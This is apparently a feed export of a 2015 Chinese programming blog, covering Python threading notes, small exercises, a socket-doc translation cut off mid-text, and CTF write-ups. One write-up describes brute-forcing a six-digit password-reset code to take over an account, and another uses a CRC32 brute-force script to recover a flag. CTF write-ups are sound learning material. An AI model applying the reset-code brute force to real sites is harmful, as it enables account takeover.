class="line"><span class="comment">#只需要覆盖__init__,run两个方法就够了。start方法用来激活run方法</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	a = test()</span><br><span class="line">	a.start()</span><br><span class="line">	a.join()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'hh'</span></span><br></pre></td></tr></table></figure></p>
<p>等理解的更深入了再更新博客～～<br>==================update time : 24/3==================</p>
<p>今天看了看python类的用法，对上面的用法也大致了解了。。就在上文的代码中加些注释。。</p>
<h2 id="0x02_Queue模块">0x02 Queue模块</h2><p>Queue是队列操作模块,用于线程之间的数据交换，举个例子，子线程1从文件中读取数据，然后存入Queue —&gt; <code>Queue.Queue.put(xxx) #把xxx放入Queue</code><br>然后子线程2，进行读取Queue中的内容进行其他操作，比如写入另一个文件。。还是上一串代码吧:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> Queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		threading.Thread.__init__(self)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">global</span> isFinal</span><br><span class="line">		f = open(<span class="string">'file1.txt'</span>)</span><br><span class="line">		a = Queue()</span><br><span class="line">		<span class="keyword">for</span> eachline <span class="keyword">in</span> f:</span><br><span class="line">			a.put(eachline)</span><br><span class="line">		f.close()</span><br><span class="line">		isFinal = <span class="number">1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">writefile</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		threading.Thread.__init__(self)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">global</span> isFinal</span><br><span class="line">		f = open(<span class="string">'file2.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">		b = Queue()</span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">			<span class="keyword">if</span> b.empty() <span class="keyword">and</span> isFinal:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			cont = b.get()　　　　　<span class="comment">#get()每次会从Queue队列中获取一行信息，所以需要循环</span></span><br><span class="line">			f.write(cont)</span><br><span class="line">		f.close()</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">	rea = readfile()</span><br><span class="line">	rea.start()</span><br><span class="line">	writ = writefile()</span><br><span class="line">	writ.start()</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03_Lock_方法">0x03 Lock 方法</h2><p>多线程的程序会有一个问题，比如上面的代码中，writefile类有两个线程在运行，由于计算机处理速度很快，所以会出现这样一种情况:</p>
<p>Queue中只剩下一个,第一个线程进行b.empty()判断，为false，还没执行到b.get()的时候，第二个线程也执行了b.empty(),同样返回false，然后前面的线程get()到了内容，第二个线程由于Queue队列里没有数据了，进行get()操作将会报错。这是很糟糕的情况。</p>
<p>因此，就有了Lock方法。。举个例子。</p>
<p>线程一读取队列中数据之前，把锁锁上，然后进行判断b.empty()，执行b.get()。。然后释放锁。。在锁锁上的地方，线程二将会被卡在那，不会执行任何操作。直到解锁。贴以小串代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="keyword">if</span> lock.acquire():　<span class="comment">#如果lock处于未被锁定状态，则锁定lock，然后返回True。如果lock处于锁定状态,则不进行任何操作,由于既不会返回True也会返回False.所以if语句会被卡在这里，不进行任何操作</span></span><br><span class="line">	<span class="keyword">if</span> b.empty() <span class="keyword">and</span> isFinal:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	cont = b.get()</span><br><span class="line">	lock.release()  <span class="comment">#解锁</span></span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p>做一个python多线程的笔记。。。。<br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[TCP/IP]]></title>
    <link href="http://lazysheep.cc/2015/03/14/0x1C/"/>
    <id>http://lazysheep.cc/2015/03/14/0x1C/</id>
    <published>2015-03-14T04:39:54.000Z</published>
    <updated>2015-03-14T04:49:24.000Z</updated>
    <content type="html"><![CDATA[<p><strong>今天看到一篇不错的TCP/IP的文章，，这里贴张传送门。。作者说是篇快餐文，，</strong><br><a id="more"></a></p>
<p><a href="http://coolshell.cn/articles/11564.html" target="_blank" rel="external">TCP/IP的那些事儿(上)</a><br><a href="http://coolshell.cn/articles/11609.html" target="_blank" rel="external">TCP/IP的那些事儿(下)</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>今天看到一篇不错的TCP/IP的文章，，这里贴张传送门。。作者说是篇快餐文，，</strong><br>]]>
    
    </summary>
    
      <category term="TCP/IP" scheme="http://lazysheep.cc/tags/TCP-IP/"/>
    
      <category term="网络" scheme="http://lazysheep.cc/tags/%E7%BD%91%E7%BB%9C/"/>
    
      <category term="R-carrier" scheme="http://lazysheep.cc/categories/R-carrier/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python练习(二)]]></title>
    <link href="http://lazysheep.cc/2015/03/13/0x1B/"/>
    <id>http://lazysheep.cc/2015/03/13/0x1B/</id>
    <published>2015-03-13T07:48:11.000Z</published>
    <updated>2015-03-13T08:33:04.000Z</updated>
    <content type="html"><![CDATA[<p><strong>github上的第0009题,还有0011题。。。</strong><br><a id="more"></a><br>直接上代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#0009.py</span></span><br><span class="line"><span class="keyword">import</span> re,sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_find</span><span class="params">(fi)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		f = open(fi)</span><br><span class="line">		con = f.read()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'找不到此文件！'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'HTML文件中的url为：'</span></span><br><span class="line">	url = re.findall(<span class="string">'[a-zA-Z]+://[^\s]+"'</span>,con)       <span class="comment">#正则匹配url</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> url:</span><br><span class="line">		x = i.strip(<span class="string">'"'</span>)</span><br><span class="line">		<span class="keyword">print</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:　　　　　</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		fi = sys.argv[<span class="number">1</span>]</span><br><span class="line">		_find(fi)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			fi = raw_input(<span class="string">'请输入HTML文件名：\n'</span>)</span><br><span class="line">			_find(fi)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'获取文件名失败！'</span></span><br></pre></td></tr></table></figure>
<p>效果图：</p>
<p><img src="/img/0009.png" alt="效果图"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#0011.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'filtered_words.txt'</span>)</span><br><span class="line">con = f.read()</span><br><span class="line">con1 = con.split()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pei</span><span class="params">(tent)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> tent <span class="keyword">in</span> con1:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Freedom'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Human Rights'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		wri = raw_input()</span><br><span class="line">		<span class="keyword">if</span> wri == <span class="string">'00'</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		pei(wri)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'输入00来暂停程序～'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'请输入词语：'</span></span><br><span class="line">	run()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Over!'</span></span><br></pre></td></tr></table></figure>
<p>效果图：<br><img src="/img/0011.png" alt="效果图"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>github上的第0009题,还有0011题。。。</strong><br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Week5]]></title>
    <link href="http://lazysheep.cc/2015/03/12/0x1A/"/>
    <id>http://lazysheep.cc/2015/03/12/0x1A/</id>
    <published>2015-03-12T07:21:13.000Z</published>
    <updated>2015-04-18T13:33:00.000Z</updated>
    <content type="html"><![CDATA[<p><strong>终于又有题做了，，不过这次只出了一题</strong><br><a id="more"></a></p>
<h2 id="0x0D_EasyUser(Rank:200)">0x0D EasyUser(Rank:200)</h2><p>这题，打开一看，猜测是利用密码找回的漏洞，以前遇到过类似的题目，验证码是４位纯数字，使用爆破，不过这题是６位纯数字，爆破需要的时间会很久，所以没在第一时间去爆。。后面提示从500000开始爆，，，</p>
<p>因为输入错误的验证码后会出现 <code>验证码错误！请10分钟后再次尝试！</code></p>
<p>所以走入了误区，，，，以为需要加上邮箱，，，，，可是没爆出来，，，最后发现，，只要爆 <code>number</code>　参数就OK，，（神马１０分钟后重试都是骗人的。。。）</p>
<p>爆出密码之后，发现用户名不是admin，，，后面就是脑洞的问题了，，随便猜些用户名尝试，后面根据 <code>peter@easyuser.me</code>　猜出用户名</p>
<p>Get Flag！</p>
<p>=================write time : 16/3 =======================</p>
<p>昨天week5又出了一题，，算是杂项题，上次美国的CTF出现过这类的题目。。</p>
<h2 id="0x0E_听说你们想玩其他类型的题目？(Rank_:_200)">0x0E 听说你们想玩其他类型的题目？(Rank : 200)</h2><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">'000000000000'</span>:<span class="string">' '</span>,</span><br><span class="line"><span class="string">'100000000000'</span>:<span class="string">'&amp;'</span>,</span><br><span class="line"><span class="string">'010000000000'</span>:<span class="string">'-'</span>,</span><br><span class="line"><span class="string">'001000000000'</span>:<span class="string">'0'</span>,</span><br><span class="line"><span class="string">'000100000000'</span>:<span class="string">'1'</span>,</span><br><span class="line"><span class="string">'000010000000'</span>:<span class="string">'2'</span>,</span><br><span class="line"><span class="string">'000001000000'</span>:<span class="string">'3'</span>,</span><br><span class="line"><span class="string">'000000100000'</span>:<span class="string">'4'</span>,</span><br><span class="line"><span class="string">'000000010000'</span>:<span class="string">'5'</span>,</span><br><span class="line"><span class="string">'000000001000'</span>:<span class="string">'6'</span>,</span><br><span class="line"><span class="string">'000000000100'</span>:<span class="string">'7'</span>,</span><br><span class="line"><span class="string">'000000000010'</span>:<span class="string">'8'</span>,</span><br><span class="line"><span class="string">'000000000001'</span>:<span class="string">'9'</span>,</span><br><span class="line"><span class="string">'100100000000'</span>:<span class="string">'a'</span>,</span><br><span class="line"><span class="string">'100010000000'</span>:<span class="string">'b'</span>,</span><br><span class="line"><span class="string">'100001000000'</span>:<span class="string">'c'</span>,</span><br><span class="line"><span class="string">'100000100000'</span>:<span class="string">'d'</span>,</span><br><span class="line"><span class="string">'100000010000'</span>:<span class="string">'e'</span>,</span><br><span class="line"><span class="string">'100000001000'</span>:<span class="string">'f'</span>,</span><br><span class="line"><span class="string">'100000000100'</span>:<span class="string">'g'</span>,</span><br><span class="line"><span class="string">'100000000010'</span>:<span class="string">'h'</span>,</span><br><span class="line"><span class="string">'100000000001'</span>:<span class="string">'i'</span>,</span><br><span class="line"><span class="string">'010100000000'</span>:<span class="string">'j'</span>,</span><br><span class="line"><span class="string">'010010000000'</span>:<span class="string">'k'</span>,</span><br><span class="line"><span class="string">'010001000000'</span>:<span class="string">'l'</span>,</span><br><span class="line"><span class="string">'010000100000'</span>:<span class="string">'m'</span>,</span><br><span class="line"><span class="string">'010000010000'</span>:<span class="string">'n'</span>,</span><br><span class="line"><span class="string">'010000001000'</span>:<span class="string">'o'</span>,</span><br><span class="line"><span class="string">'010000000100'</span>:<span class="string">'p'</span>,</span><br><span class="line"><span class="string">'010000000010'</span>:<span class="string">'q'</span>,</span><br><span class="line"><span class="string">'010000000001'</span>:<span class="string">'r'</span>,</span><br><span class="line"><span class="string">'001100000000'</span>:<span class="string">'/'</span>,</span><br><span class="line"><span class="string">'001010000000'</span>:<span class="string">'s'</span>,</span><br><span class="line"><span class="string">'001001000000'</span>:<span class="string">'t'</span>,</span><br><span class="line"><span class="string">'001000100000'</span>:<span class="string">'u'</span>,</span><br><span class="line"><span class="string">'001000010000'</span>:<span class="string">'v'</span>,</span><br><span class="line"><span class="string">'001000001000'</span>:<span class="string">'w'</span>,</span><br><span class="line"><span class="string">'001000000100'</span>:<span class="string">'x'</span>,</span><br><span class="line"><span class="string">'001000000010'</span>:<span class="string">'y'</span>,</span><br><span class="line"><span class="string">'001000000001'</span>:<span class="string">'z'</span>,</span><br><span class="line"><span class="string">'100001000010'</span>:<span class="string">'.'</span>,</span><br><span class="line"><span class="string">'100000010010'</span>:<span class="string">'('</span>,</span><br><span class="line"><span class="string">'010000010010'</span>:<span class="string">')'</span>,</span><br><span class="line"><span class="string">'000000010010'</span>:<span class="string">"'"</span>,</span><br><span class="line"><span class="string">'000010000010'</span>:<span class="string">':'</span>,</span><br><span class="line"><span class="string">'100000100010'</span>:<span class="string">'&lt;'</span>,</span><br><span class="line"><span class="string">'001000000110'</span>:<span class="string">'?'</span>,</span><br><span class="line"><span class="string">'000000001010'</span>:<span class="string">'='</span>,</span><br><span class="line"><span class="string">'010010000010'</span>:<span class="string">'!'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那张图片对照着这个字典一个一个对就好了，，一竖代表一个字符，被涂黑的代表1。。。然后就一竖一竖对过去，，</p>
<p>Get Flag !</p>
<p>====================update time : 25/3======================</p>
<h2 id="0x0F_上面那个太简单了(Rank_:_300)">0x0F 上面那个太简单了(Rank : 300)</h2><p>在ubuntu上，通过命令 <code>zipinfo -v misc300_31ba4d3f387ff3e09fd77eb244288b5e</code></p>
<p>得到6个文件的CRC :<br>文件 ——————-&gt;  CRC<br>1.txt ——————-&gt;  e17b3765<br>2.txt ——————-&gt;  f30bdd6c<br>3.txt ——————-&gt; 371083d4<br>4.txt ——————-&gt;  71059cdb<br>5.txt ——————-&gt;  1268bf25<br>6.txt ——————-&gt;  0a4f8583</p>
<p>先正向 : ‘hctf{‘ 的CRC 为 e17b3765 可知这6个文件的内容合在一起就是flag。。。通过百度，知道CRC和md5一样没法逆向解密，可知这题只能通过暴力破解了，而且一个文件只有5个字节。。所以自己写个脚本暴力破解:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> binascii,threading,string</span><br><span class="line">x = string.ascii_lowercase</span><br><span class="line">x += <span class="string">'0123456789'</span></span><br><span class="line"><span class="keyword">global</span> result</span><br><span class="line">result=[<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">runcrc</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,crr,num,fin=False)</span>:</span></span><br><span class="line">		threading.Thread.__init__(self)</span><br><span class="line">		self.crr = crr</span><br><span class="line">		self.fin = fin</span><br><span class="line">		self.num = num</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> y1 <span class="keyword">in</span> x:</span><br><span class="line">			<span class="keyword">for</span> y2 <span class="keyword">in</span> x:</span><br><span class="line">				<span class="keyword">for</span> y3 <span class="keyword">in</span> x:</span><br><span class="line">					<span class="keyword">for</span> y4 <span class="keyword">in</span> x:</span><br><span class="line">						<span class="keyword">if</span> <span class="keyword">not</span> self.fin:</span><br><span class="line">							<span class="keyword">for</span> y5 <span class="keyword">in</span> x:</span><br><span class="line">								yy = y1+y2+y3+y4+y5</span><br><span class="line">								ccc = binascii.crc32(yy) &amp; <span class="number">0xffffffff</span></span><br><span class="line">								<span class="keyword">if</span> ccc == self.crr:</span><br><span class="line">									result[self.num] = yy</span><br><span class="line">									<span class="keyword">break</span></span><br><span class="line">								</span><br><span class="line">						<span class="keyword">else</span>:</span><br><span class="line">							yy = y1+y2+y3+y4+<span class="string">'&#125;'</span></span><br><span class="line">							ccc = binascii.crc32(yy)</span><br><span class="line">							<span class="keyword">if</span> ccc == self.crr:</span><br><span class="line">									result[self.num] = yy</span><br><span class="line">									<span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	crcc = [<span class="number">0xf30bdd6c</span>,<span class="number">0x371083d4</span>,<span class="number">0x71059cdb</span>,<span class="number">0x1268bf25</span>]</span><br><span class="line">	<span class="keyword">for</span> h <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		ddd = runcrc(crcc[h],h)</span><br><span class="line">		ddd.start()</span><br><span class="line">	f = runcrc(<span class="number">0x0a4f8583</span>,<span class="number">4</span>,<span class="keyword">True</span>)</span><br><span class="line">	f.start()</span><br><span class="line">	<span class="keyword">while</span>(f.isAlive() <span class="keyword">or</span> ddd.isAlive()):</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'hctf&#123;'</span>+<span class="string">''</span>.join(result)</span><br></pre></td></tr></table></figure>
<p>Get Flag!</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>终于又有题做了，，不过这次只出了一题</strong><br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
    
      <category term="爆破" scheme="http://lazysheep.cc/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python -- socket]]></title>
    <link href="http://lazysheep.cc/2015/03/10/0x19/"/>
    <id>http://lazysheep.cc/2015/03/10/0x19/</id>
    <published>2015-03-10T02:02:49.000Z</published>
    <updated>2015-04-24T01:34:44.000Z</updated>
    <content type="html"><![CDATA[<p>时常翻译些python英文文档，，一方面学习python，一方面加强自己英语水平．．．<br><a id="more"></a></p>
<p><strong>socket是应用层与传输层的编程接口～</strong></p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">Help <span class="keyword">on</span> <span class="keyword">class</span> _socketobject <span class="keyword">in</span> <span class="keyword">module</span> socket:</span><br><span class="line"><span class="preprocessor">#在模块socket中_socketobject类帮助文档</span></span><br><span class="line"><span class="keyword">class</span> _socketobject(__builtin__.<span class="built_in">object</span>)</span><br><span class="line">	｜socket([family[, type[, proto]]]) -&gt; socket <span class="built_in">object</span> <span class="preprocessor">#socket对象，有三个参数</span></span><br><span class="line">	｜</span><br><span class="line">	｜Open a socket <span class="keyword">of</span> the given type.  The family argument specifies the</span><br><span class="line">	｜address family; it defaults <span class="keyword">to</span> AF_INET.  The type argument specifies</span><br><span class="line">	｜whether this <span class="keyword">is</span> a stream (SOCK_STREAM, this <span class="keyword">is</span> the <span class="keyword">default</span>)</span><br><span class="line">	｜<span class="keyword">or</span> datagram (SOCK_DGRAM) socket.  The protocol argument defaults <span class="keyword">to</span> <span class="number">0</span>,</span><br><span class="line">	｜specifying the <span class="keyword">default</span> protocol.  Keyword arguments are accepted.</span><br><span class="line">	｜<span class="preprocessor">#作为一个socket类型打开. family参数指定了地址族,默认值为AF_INET. type 参数指定了socket是数据流(SOCK_STREAM,默认值)还是数据报(SOCK_DGRAM). proto参数默认值为0, 指定了默认协议，关键词参数是可选的 </span></span><br><span class="line">	｜<span 